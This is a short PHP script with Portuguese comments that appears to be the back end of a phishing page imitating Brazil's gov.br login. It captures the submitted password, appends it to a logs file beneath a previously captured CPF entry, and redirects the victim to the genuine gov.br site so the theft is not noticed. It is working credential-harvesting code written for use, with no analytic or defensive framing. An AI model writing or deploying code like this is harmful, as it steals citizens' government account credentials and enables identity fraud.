<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capturando o valor do input "password"
    $senha = $_POST['password'];

    // Caminho do arquivo onde os dados serão salvos (voltando um diretório e certifique-se que tenha permissões de escrita)
    $file = '../logs.txt';

    // Abre o arquivo em modo de escrita (modo "a" - append, adicionando ao final do arquivo)
    $handle = fopen($file, 'a');

    // Escreve a senha no arquivo abaixo do "CPF:" com o prefixo "Senha:" e prepara nova linha
    fwrite($handle, "Senha: " . $senha . "\n");

    // Fecha o arquivo
    fclose($handle);

    // Redireciona para outra página após salvar a senha (altere "outra_pagina.php" para a URL desejada)
    ob_start();
    header("Location: https://www.gov.br/pt-br");
    ob_end_flush();
    exit(); // Certifica-se de que o script seja encerrado após o redirecionamento
}
?>